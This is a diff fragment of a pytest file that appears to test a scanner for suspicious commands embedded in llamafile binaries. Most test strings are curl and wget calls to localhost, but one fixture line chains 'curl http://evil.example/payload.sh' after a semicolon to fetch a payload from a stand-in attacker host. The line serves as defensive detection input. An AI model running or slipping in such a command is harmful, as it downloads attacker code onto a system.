+    assert all(check.severity != IssueSeverity.CRITICAL for check in runtime_checks)
+
+
+@pytest.mark.parametrize(
+    "runtime_line",
+    [
         "curl --cacert cert.pem http://127.0.0.1/payload",
         "curl -w status.txt http://user:secret@localhost/payload",
         "wget -P output.dir http://127.0.0.1/payload",
@@ -2472,6 +3098,12 @@ def test_llamafile_scanner_does_not_correlate_command_near_matches(
         "curl --connect-to localhost:80::80 http://localhost/payload",
         "curl --connect-to localhost:80:[::1]:80 http://localhost/payload",
         "curl --resolve localhost:80:[::1] http://localhost/payload",
+        "wget -e https_proxy=http://127.0.0.1 http://localhost/payload",
+        "wget --execute=robots=off http://localhost/payload",
+        "curl --output internal-host http://localhost/payload",
+        "curl localhost",
+        "curl 2130706433",
+        "curl 0",
     ],
 )
 def test_llamafile_scanner_does_not_correlate_local_transfer_targets(
@@ -2547,7 +3179,7 @@ def test_llamafile_scanner_does_not_skip_mixed_safe_and_suspicious_runtime_strin
     binary.write_bytes(
         _build_llamafile_blob(
             runtime_lines=[
-                "llamafile curl http://evil.example/payload.sh",
+                "llamafile ; curl http://evil.example/payload.sh",
             ]
         )
     )
